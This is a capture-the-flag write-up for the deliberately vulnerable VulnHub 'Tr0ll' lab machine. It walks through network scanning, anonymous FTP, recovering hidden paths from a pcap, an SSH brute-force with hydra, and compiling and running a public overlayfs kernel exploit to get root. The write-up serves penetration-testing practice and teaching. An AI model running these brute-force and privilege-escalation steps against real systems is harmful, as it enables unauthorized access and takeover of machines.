# Tr0ll writeup
Start with network scan
```bash
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                    
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.201.61.58    d8:a8:81:42:0c:eb      1      60  Unknown vendor                                                                                                                                                 
 10.201.61.124   c6:66:69:5b:8d:73      1      60  Unknown vendor                                                                                                                                                 
 10.201.61.165   00:0c:29:5e:ad:65      1      60  VMware, Inc.
```
\
Next, Open ports
```bash
Open 10.201.61.165:80
Open 10.201.61.165:22
Open 10.201.61.165:21
```
\
accesing port 80 , we just get trolled , then we see robots.txt
```bash
User-agent:*
Disallow: /secret
```
\
again got trolled, so used dirb on it , still no result
\
Now we move on to port 21 FTP, We can login as anonymous
```bash
ftp 10.201.61.165                                                                                                                           
Connected to 10.201.61.165.
220 (vsFTPd 3.0.2)
Name (10.201.61.165:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||40607|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        112          4096 Aug 09  2014 .
drwxr-xr-x    2 0        112          4096 Aug 09  2014 ..
-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap
226 Directory send OK.
ftp> lcd cysec/vulnhub/tr0ll/
Local directory now: /home/kali/cysec/vulnhub/tr0ll
ftp> get lol.pcap
local: lol.pcap remote: lol.pcap
229 Entering Extended Passive Mode (|||50608|).
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
100% |**********************************************************************************************************************************************************************|  8068        6.57 MiB/s    00:00 ETA
226 Transfer complete.
8068 bytes received in 00:00 (4.48 MiB/s)
```
\
We open the pcap using wireshark and see a lot of ftp protocol requests/responses, then we see that a file is being retrieved
```bash

RETR secret_stuff.txt

150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
226 Transfer complete.
```
\
So after finding a FTP-DATA protocol packet , we check it 
```bash
Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P

Sucks, you were so close... gotta TRY HARDER!
```
\
So I try to find where the sup3rs3cr3tdirlol directory could be and it was at /sup3rs3cr3tdirlol itself
\
Then we get a file roflmao , which is an ELF file , and running strings on it gives some important data
```bash
TRh
[^_]
Find address 0x0856BF to proceed
;*2$"
GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
```
\
So now '0x0856BF' is also a directory by guess (address == location == directory), and it is also at /0x0856BF
```bash
[PARENTDIR]	Parent Directory	 	-	 
[DIR]	good_luck/	2014-08-12 23:59	-	 
[DIR]	this_folder_contains_the_password/	2014-08-12 23:58	-	 
```
\
Then we get two files
```bash
wget 'http://10.201.61.165/0x0856BF/good_luck/which_one_lol.txt'
--2026-01-17 11:48:31--  http://10.201.61.165/0x0856BF/good_luck/which_one_lol.txt
Connecting to 10.201.61.165:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 109 [text/plain]
Saving to: ‘which_one_lol.txt’

which_one_lol.txt                                    100%[=====================================================================================================================>]     109  --.-KB/s    in 0s      

2026-01-17 11:48:31 (20.0 MB/s) - ‘which_one_lol.txt’ saved [109/109]

                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\tr0ll> cat which_one_lol.txt 
maleus
ps-aux
felux
Eagle11
genphlux < -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\tr0ll> wget 'http://10.201.61.165/0x0856BF/this_folder_contains_the_password/Pass.txt'
--2026-01-17 11:48:53--  http://10.201.61.165/0x0856BF/this_folder_contains_the_password/Pass.txt
Connecting to 10.201.61.165:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12 [text/plain]
Saving to: ‘Pass.txt’

Pass.txt                                             100%[=====================================================================================================================>]      12  --.-KB/s    in 0s      

2026-01-17 11:48:53 (2.02 MB/s) - ‘Pass.txt’ saved [12/12]

                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\tr0ll> cat Pass.txt                 
Good_job_:)
```
\
Tried brute forcing ssh with hydra , but nothing 
\
Then we understand that 'Pass.txt' could also be a password 
```bash
 echo "Pass.txt" >>Pass.txt                   
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\tr0ll> cat Pass.txt 
Good_job_:)
Pass.txt
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\tr0ll> hydra -L which_one_lol.txt -P Pass.txt -t20 ssh://10.201.61.165  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-17 11:52:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 20 tasks per 1 server, overall 20 tasks, 20 login tries (l:10/p:2), ~1 try per task
[DATA] attacking ssh://10.201.61.165:22/
[22][ssh] host: 10.201.61.165   login: overflow   password: Pass.txt
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-17 11:52:26
```
\
Now lets login using ssh and make it stable shell
```bash
Last login: Wed Aug 13 01:14:09 2014 from 10.0.0.12
Could not chdir to home directory /home/overflow: No such file or directory
$ echo $0
-sh
$ python -c "import pty; pty.spawn('/bin/bash')"
overflow@troll:/$ export TERM=xterm
```
\
Searched for kernel exploit
```bash
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                                                             | linux/local/37292.c
```
```bash
$ cd /tmp
$ nano 1.c
$ gcc 1.c
$ gcc 1.c -o expl
$ ls -la
total 40
drwxrwxrwt  2 root     root      4096 Jan 17 09:07 .
drwxr-xr-x 21 root     root      4096 Aug  9  2014 ..
-rw-rw-r--  1 overflow overflow  4970 Jan 17 09:07 1.c
-rwxrwxr-x  1 overflow overflow 12145 Jan 17 09:07 a.out
-rwxrwxr-x  1 overflow overflow 12145 Jan 17 09:07 expl
$ chmod +x expl
$ ls -la
total 40
drwxrwxrwt  2 root     root      4096 Jan 17 09:07 .
drwxr-xr-x 21 root     root      4096 Aug  9  2014 ..
-rw-rw-r--  1 overflow overflow  4970 Jan 17 09:07 1.c
-rwxrwxr-x  1 overflow overflow 12145 Jan 17 09:07 a.out
-rwxrwxr-x  1 overflow overflow 12145 Jan 17 09:07 expl
$ ./expl
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1002(overflow)
cd /root
# ls -la
total 28
drwx------  3 root root 4096 Aug 13  2014 .
drwxr-xr-x 21 root root 4096 Aug  9  2014 ..
-rw-------  1 root root    0 Aug 13  2014 .bash_history
-rw-r--r--  1 root root   74 Aug 10  2014 .selected_editor
drwx------  2 root root 4096 Aug 10  2014 .ssh
-rw-------  1 root root 5538 Aug 13  2014 .viminfo
-rw-r--r--  1 root root   58 Aug 10  2014 proof.txt
# cat pro*
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
```
The End, Thank you for reading till here
